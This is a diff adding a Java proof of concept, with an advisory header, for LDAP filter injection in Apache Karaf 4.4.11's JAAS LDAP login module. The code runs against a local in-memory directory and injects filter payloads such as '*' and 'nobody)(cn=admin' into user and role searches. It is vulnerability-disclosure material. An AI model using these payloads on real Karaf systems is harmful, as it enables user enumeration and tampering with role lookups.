@@ -1,0 +1,153 @@
+/*
+
+
+Apache Karaf 4.4.11 JAAS LDAP Login Modules LDAP Filter Injection
+
+
+Vendor: The Apache Software Foundation
+Product web page: https://karaf.apache.org
+Affected version: 4.4.11
+
+Summary: Karaf is a lightweight, powerful, and enterprise
+ready modulith runtime. It provides all the ecosystem and
+bootstrapping options you need for your applications.
+
+Desc: Apache Karaf's JAAS LDAP login module is affected by
+LDAP filter injection. The user and role LDAP search filters
+are built in LDAPCache by string substitution: each placeholder
+(%u for the username, %dn for the user DN, %fqdn for the fully
+qualified DN) is inserted with java.util.regex Matcher.quoteReplacement
+followed by doubling backslashes, which is regex-replacement
+escaping, not RFC 2254 / RFC 4515 LDAP filter escaping. The
+filter construction itself therefore does not neutralize LDAP
+metacharacters, it relies on the caller to have encoded the
+values. The login module does pre-encode the username with
+Util.doRFC2254Encoding before the user search, but the role
+search filter also substitutes the DN values (%dn, %fqdn)
+with no LDAP escaping, and the filter builder performs none
+of its own. As a result a value that reaches the filter without
+prior encoding is not neutralized and can alter the LDAP query.
+
+Tested on: org.apache.karaf.jaas.modules-4.4.11.jar (Maven Central)
+           Apache Karaf JAAS LDAP login module
+           Eclipse Temurin OpenJDK 21.0.6 (LTS)
+           UnboundID LDAP SDK for Java 7.0.1
+           Microsoft Windows 10
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+Macedonian Information Security Research & Development Laboratory
+Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+
+
+Advisory ID: ZSL-2026-6006
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6006
+CVE ID: CVE-2026-90979
+CVE URL: https://www.cve.org/CVERecord?id=CVE-2026-90979
+
+
+13.08.2026
+
+*/
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import org.apache.karaf.jaas.modules.ldap.LDAPOptions;
+import org.apache.karaf.jaas.modules.ldap.LDAPCache;
+import javax.naming.directory.InitialDirContext;
+import javax.naming.Context;
+import java.util.Hashtable;
+import java.util.HashMap;
+import java.util.Arrays;
+import java.util.Map;
+
+public class KarafLdapPoc {
+
+    static final int PORT = 11389;
+    static final String BASE = "dc=zeroscience,dc=com";
+
+    public static void main(String[] args) throws Exception {
+        InMemoryDirectoryServerConfig cfg = new InMemoryDirectoryServerConfig(BASE);
+        cfg.addAdditionalBindCredentials("cn=Directory Manager", "managerpw");
+        cfg.setListenerConfigs(InMemoryListenerConfig.createLDAPConfig("default", PORT));
+        cfg.setSchema(null);
+        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(cfg);
+        ds.startListening();
+
+        ds.add("dn: " + BASE, "objectClass: domain", "dc: zeroscience");
+        ds.add("dn: ou=users," + BASE, "objectClass: organizationalUnit", "ou: users");
+        ds.add("dn: uid=hans,ou=users," + BASE, "objectClass: inetOrgPerson",
+               "cn: hans", "sn: hans", "uid: hans", "userPassword: hanspw");
+        ds.add("dn: uid=bubby,ou=users," + BASE, "objectClass: inetOrgPerson",
+               "cn: bubby", "sn: bubby", "uid: bubby", "userPassword: bubbypw");
+        ds.add("dn: ou=groups," + BASE, "objectClass: organizationalUnit", "ou: groups");
+        ds.add("dn: cn=users,ou=groups," + BASE, "objectClass: posixGroup",
+               "cn: users", "gidNumber: 1000", "memberUid: hans", "memberUid: bubby");
+        ds.add("dn: cn=admin,ou=groups," + BASE, "objectClass: posixGroup",
+               "cn: admin", "gidNumber: 1001", "memberUid: bubby");
+
+        System.out.println("[*] In-memory LDAP up on ldap://127.0.0.1:" + PORT + " (base " + BASE + ")");
+        System.out.println("    users: hans(hanspw), bubby(bubbypw) | groups: users=[hans,bubby], admin=[bubby]\n");
+
+        Map<String, Object> o = new HashMap<>();
+        o.put(LDAPOptions.CONNECTION_URL, "ldap://127.0.0.1:" + PORT);
+        o.put(LDAPOptions.CONNECTION_USERNAME, "cn=Directory Manager");
+        o.put(LDAPOptions.CONNECTION_PASSWORD, "managerpw");
+        o.put(LDAPOptions.USER_BASE_DN, "ou=users," + BASE);
+        o.put(LDAPOptions.USER_FILTER, "(uid=%u)");
+        o.put(LDAPOptions.USER_SEARCH_SUBTREE, "true");
+        o.put(LDAPOptions.ROLE_BASE_DN, "ou=groups," + BASE);
+        o.put(LDAPOptions.ROLE_FILTER, "(memberUid=%u)");
+        o.put(LDAPOptions.ROLE_NAME_ATTRIBUTE, "cn");
+        o.put(LDAPOptions.ROLE_SEARCH_SUBTREE, "true");
+        o.put(LDAPOptions.AUTHENTICATION, "simple");
+        o.put(LDAPOptions.DISABLE_CACHE, "true");
+        o.put(LDAPOptions.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
+        LDAPCache cache = new LDAPCache(new LDAPOptions(o));
+
+        System.out.println("=== BASELINE (honest, no injection) ===");
+        String[] hansDn = cache.getUserDnAndNamespace("hans");
+        System.out.println("getUserDnAndNamespace(\"hans\") = " + Arrays.toString(hansDn));
+        String[] hansRoles = cache.getUserRoles("hans", hansDn[0], hansDn[1]);
+        System.out.println("getUserRoles(\"hans\")           = " + Arrays.toString(hansRoles) + "   (expected: [users], NOT admin)");
+        String[] missing = cache.getUserDnAndNamespace("nonexistent");
+        System.out.println("getUserDnAndNamespace(\"nonexistent\") = " + Arrays.toString(missing) + "   (expected: null)\n");
+
+        System.out.println("=== PRIMITIVE A: user-search filter injection ===");
+        String[] star = cache.getUserDnAndNamespace("*");
+        System.out.println("getUserDnAndNamespace(\"*\") = " + Arrays.toString(star));
+        System.out.println("  -> A correct (RFC-4515-escaped) impl would search for a LITERAL uid=\"*\" and return null.");
+        System.out.println("  -> Returning a real user DN PROVES '*' is injected as an LDAP wildcard (CWE-90).\n");
+
+        System.out.println("=== PRIMITIVE B: role-search filter injection ===");
+        String[] injRolesStar = cache.getUserRoles("*", hansDn[0], hansDn[1]);
+        System.out.println("getUserRoles(\"*\")              = " + Arrays.toString(injRolesStar) + "   (memberUid=* -> ALL groups)");
+        String[] injRolesBool = cache.getUserRoles("nobody)(cn=admin", hansDn[0], hansDn[1]);
+        System.out.println("getUserRoles(\"nobody)(cn=admin\") = " + Arrays.toString(injRolesBool) + "   (boolean injection targeting admin)");
+        System.out.println("  -> If 'admin' appears here for a non-admin principal, the role filter is injectable.\n");
+
+        System.out.println("=== AUTH-BYPASS CHECK (search-then-bind still gates) ===");
+        if (star != null) {
+            String dn = star[0] + "," + "ou=users," + BASE;
+            boolean bound;
+            try {
+                Hashtable<String, Object> env = new Hashtable<>();
+                env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
+                env.put(Context.PROVIDER_URL, "ldap://127.0.0.1:" + PORT);
+                env.put(Context.SECURITY_AUTHENTICATION, "simple");
+                env.put(Context.SECURITY_PRINCIPAL, dn);
+                env.put(Context.SECURITY_CREDENTIALS, "WRONG-PASSWORD");
+                new InitialDirContext(env).close();
+                bound = true;
+            } catch (Exception e) {
+                bound = false;
+            }
+            System.out.println("bind(" + dn + ", \"WRONG-PASSWORD\") succeeded? " + bound
+                    + "   (expected: false -> injection alone is NOT a pre-auth bypass)\n");
+        }
+
+        System.out.println("[*] Done.");
+        ds.shutDown(true);
+    }
+}
